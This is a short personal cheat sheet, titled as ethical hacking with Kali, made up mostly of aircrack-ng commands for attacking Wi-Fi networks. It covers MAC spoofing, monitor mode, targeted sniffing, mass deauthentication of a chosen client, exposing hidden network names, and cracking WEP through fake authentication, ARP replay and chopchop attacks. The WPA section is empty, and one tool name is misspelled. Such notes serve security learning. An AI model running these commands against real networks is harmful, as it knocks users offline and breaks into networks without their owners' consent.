# Ethical Hacking With Kali

## Change MAC address
iwconfig to get wireless adapter name

´´´
ifconfig wlan0 down

macchanger --random wlan0

ifconfig wlan0 up
´´´

## Enable monitor mode
'''
airmon-ng start wlan0
airmon-ng stop wlan0mon

ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up

ifconfig wlan0 down
airmon-ng check kill
airmon-ng start wlan0
'''
## Sniffing
'''
airodump-ng wlan0
'''
BSSID = MAC of accesspoint
PWR = "how far away is it"
Data = nr of useful packets that has been sniffed
/s = nr of packets collected in the last 10 sec
CH = Broadcast channel
MB = Maximum speed
ENC = Encryption used
CIPHER = Cipher used
AUTH = Auth required for connection
ESSID = Name

### Sniffing specific BSSID
'''
airodump-ng --channel xx --bssid macOfTargetBSSID --write fileName wlan0


## Deauthentication attacks
'''
aireplay-ng --deauth 10000 -a apMAC -c clientToAttackMAC wlan0
'''

## Find hidden ESSID
'''
airodump-ng --bssid targetApMAC --channel targetApChannel wlan0
'''
keep it running and deauth a client from the target
'''
aireplay-ng --deauth 4 -a apMAC -c clientToAttackMAC wlan0
'''
when it reconnects we will capture the networkname in airodump-ng


## Cracking WEP
'''
airodump-ng --bssid targetApMAC --channel targetApChannel --write captureTargetAP wlan0
'''
At the same time run:
'''
aircrac-ng captureTargetAP.cap
'''

If the activity is too low increase it by:
### FakeAuth to increase traffic
First option = fakeAuth then ARP request replay
'''
airodump-ng --bssid targetApMAC --channel targetApChannel --write captureTargetAP wlan0

aireplay-ng --fakeauth 0 -a targetApMAC -h attackingWifiCardMAC wlan0

aireplay-ng --arpreplay -b targetApMAC -h attackingWifiCardMAC wlan0
'''
Second option = fakeAuth then Korek ChopChop
'''
airodump-ng --bssid targetApMAC --channel targetApChannel --write captureTargetAP wlan0

aireplay-ng --fakeauth 0 -a targetApMAC -h attackingWifiCardMAC wlan0

aireplay-ng --chopchop -b targetApMAC -h attackingWifiCardMAC wlan0
''' 
Third option
Fragmentation attack...

## WPA Cracking


